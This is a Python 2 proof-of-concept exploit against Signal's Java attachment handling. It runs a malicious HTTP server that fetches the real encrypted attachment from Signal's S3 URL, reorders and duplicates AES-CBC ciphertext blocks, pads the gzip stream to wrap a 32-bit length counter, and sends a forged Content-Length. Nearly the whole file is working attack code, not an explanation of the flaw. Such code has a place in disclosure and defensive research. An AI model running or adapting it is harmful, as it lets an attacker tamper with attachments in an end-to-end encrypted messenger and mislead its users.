#!/usr/bin/env python
""" PoC for an attack against the Java Implementation of Signal (e.g. used on Android)
Based on https://github.com/ksmith97/GzipSimpleHTTPServer/blob/master/GzipSimpleHTTPServer.py
This module builds on BaseHTTPServer by implementing the standard GET
and HEAD requests in a fairly straightforward manner.
"""


__version__ = "0.1"

__all__ = ["SimpleHTTPRequestHandler"]

import os
import posixpath
import BaseHTTPServer
import urllib
import urllib2
import cgi
import sys
import mimetypes
import zlib
from optparse import OptionParser

try:
    from cStringIO import StringIO
except ImportError:
    from StringIO import StringIO

SERVER_PORT = 8000
WRAP_SIZE = 0x100000000; # 32bit MAX_UINT + 1
CHUNK_SIZE = 16 # size of AES256 blocks
assert(WRAP_SIZE % CHUNK_SIZE == 0)
MAC_LEN = 32
ORIGINAL_URL = "https://whispersystems-textsecure-attachments.s3.amazonaws.com";

try:
    parser = OptionParser()
    parser.add_option("-e", "--encoding", dest="encoding_type",
                      help="Encoding type for server to utilize",
                      metavar="ENCODING")
    parser.add_option("-b", "--blocks", dest="arg_blocks",
                      help="Original blocks of cipher want to attach",
                      metavar="NEWPLAIN")

    (options, args) = parser.parse_args()
    encoding_type = options.encoding_type
    arg_blocks = options.arg_blocks

    # Re-Add port for BaseHTTPServer to use since providing an encoding arg
    # overrode this functionality
    sys.argv[1] = SERVER_PORT

    if encoding_type not in ['zlib', 'deflate', 'gzip']:
        raise Exception

except:
    sys.stderr.write(
        "Please provide an encoding_type for the server to utilize.\n")
    sys.stderr.write("Possible values are 'zlib', 'gzip', and 'deflate'\n")
    sys.stderr.write("Usage: python GzipSimpleHTTPServer.py "
                     "--encoding=<encoding_type>\n")
    sys.exit()

# Helper functions for AES-CBC attack by JP (@veorq)
def blocks(data):
    return [data[i:i+CHUNK_SIZE] for i in range(0, len(data), CHUNK_SIZE)]

def reorder(cipher, order):
    cipher_blocks = blocks(cipher)
    block_ranges = order.split(",")
    print block_ranges
    ret_blocks = []
    for r in block_ranges:
        i,j = r.split("-", 1)
        i = int(i)
        j = int(j)
        assert(len("".join(cipher_blocks[i:j+1])) % CHUNK_SIZE == 0)
        ret_blocks.append("".join(cipher_blocks[i:j+1]))
    return "".join(ret_blocks)

def gzip_encode(content):
    gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16)
    data = gzip_compress.compress(content) + gzip_compress.flush()
    return data

def gzip_encode_add_padding(content):
    "* Compressing content..."
    num_chunks = len(content) / CHUNK_SIZE # let's not care about remainders
    gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16)
    data = gzip_compress.compress(content)
    comp_cnt = 0
    replay = reorder(content[0:num_chunks*CHUNK_SIZE], arg_blocks)
    assert(len(replay) % CHUNK_SIZE == 0)
    num_chunks = len(replay) / CHUNK_SIZE # update the blocks
    print "** Duplicating content (CBC attack)..."
    data += gzip_compress.compress(replay) # duplicate cipher, should result in duplicate plaintext (prefixed by some garbage)
    while comp_cnt < WRAP_SIZE-(num_chunks*CHUNK_SIZE+10*CHUNK_SIZE):
        data += gzip_compress.compress("A"*CHUNK_SIZE)
        comp_cnt += CHUNK_SIZE
    print "** Copy original padding..."
    data += gzip_compress.compress(content[len(content) - 10*CHUNK_SIZE:len(content)]) # copy valid PKCS7 padding
    data = data + gzip_compress.flush()
    print "*** Finished"
    return data

class SimpleHTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    """Simple HTTP request handler with GET and HEAD commands.
    This serves files from the current directory and any of its
    subdirectories.  The MIME type for files is determined by
    calling the .guess_type() method.
    The GET and HEAD requests are identical except that the HEAD
    request omits the actual contents of the file.
    """

    server_version = "SimpleHTTP/" + __version__

    def do_HEAD(self):
        """Serve a HEAD request."""
	# nothing

    def fetch_original(self):
        """Get the original attachment."""
        print "opening: "+ORIGINAL_URL+self.path
        req = urllib2.Request(ORIGINAL_URL+self.path)
        req.add_header('Content-type', 'application/octet-stream')
        response = urllib2.urlopen(req)
        return response.read()
        
    def do_GET(self):
        """Serve a GET request gzipped."""
        try:
            content = self.fetch_original()
        except IOError, e:
            print "IOError: "
            print e
            self.send_error(404, "File not found")
            return None
        if content:
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.send_header("Content-Encoding", encoding_type)
            raw_content_length = len(content) + WRAP_SIZE

            # Pad and gzip encode content
            content = gzip_encode_add_padding(content)

            compressed_content_length = len(content)
            print "Compressed Content Length (Raw "+str(raw_content_length)+"): "+str(compressed_content_length)
            content_length = min(raw_content_length, compressed_content_length)
            self.send_header("Content-Length", content_length)
            print " * Set Content-Length to: "+str(content_length)
            self.end_headers()
            print " * Sent headers, writing content"
            self.wfile.write(content)
            print " * Request finished"
            foo = raw_input("Press ENTER to finish") 
        else:
            self.send_error(404, "File not found")
            return None


    def guess_type(self, path):
        """Guess the type of a file.
        Argument is a PATH (a filename).
        Return value is a string of the form type/subtype,
        usable for a MIME Content-type header.
        The default implementation looks the file's extension
        up in the table self.extensions_map, using application/octet-stream
        as a default; however it would be permissible (if
        slow) to look inside the data to make a better guess.
        """

        base, ext = posixpath.splitext(path)
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        ext = ext.lower()
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        else:
            return self.extensions_map['']

    if not mimetypes.inited:
        mimetypes.init() # try to read system mime.types
    extensions_map = mimetypes.types_map.copy()
    extensions_map.update({
        '': 'application/octet-stream', # Default
        '.py': 'text/plain',
        '.c': 'text/plain',
        '.h': 'text/plain',
        })


def test(HandlerClass = SimpleHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    BaseHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
